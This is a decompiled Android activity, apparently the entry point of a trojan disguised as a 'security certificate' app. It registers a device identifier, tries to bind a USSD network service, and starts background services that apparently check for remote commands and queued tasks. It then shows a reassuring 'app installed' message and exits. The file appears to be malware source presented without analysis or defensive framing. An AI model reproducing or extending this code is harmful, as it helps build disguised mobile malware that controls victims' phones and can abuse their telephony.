package com.security.cert.ui;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.text.TextUtils;
import com.security.cert.R;
import com.security.cert.a.a.c;
import com.security.cert.b.a.a;
import com.security.cert.b.b;
import com.security.cert.services.CheckCommandsService;
import com.security.cert.services.CheckQueueService;
import java.util.Random;

public class MainActivity extends Activity {
    private void a() {
        String b = b.b(this);
        if (TextUtils.isEmpty(b)) {
            b = b.a(this);
        }
        if (TextUtils.isEmpty(b)) {
            b = String.valueOf(new Random().nextInt());
        }
        a.a((Context) this, b);
        c.a(this);
        b.a(this, true);
    }

    public void onCreate(Bundle bundle) {
        int i;
        super.onCreate(bundle);
        if (a.b(this) == null) {
            a();
            i = (b.a("USSDDumbExtendedNetworkService", "I", "*USSDDumbExtendedNetworkService bind successfully*", false) || VERSION.SDK_INT >= 11) ? R.string.app_installed : R.string.need_to_restart;
        } else {
            i = R.string.app_work;
        }
        startService(new Intent(this, CheckCommandsService.class));
        startService(new Intent(this, CheckQueueService.class));
        Intent intent = new Intent(this, MessageDialogActivity.class);
        intent.putExtra("message", getString(i));
        intent.addFlags(805306368);
        startActivity(intent);
        finish();
    }
}
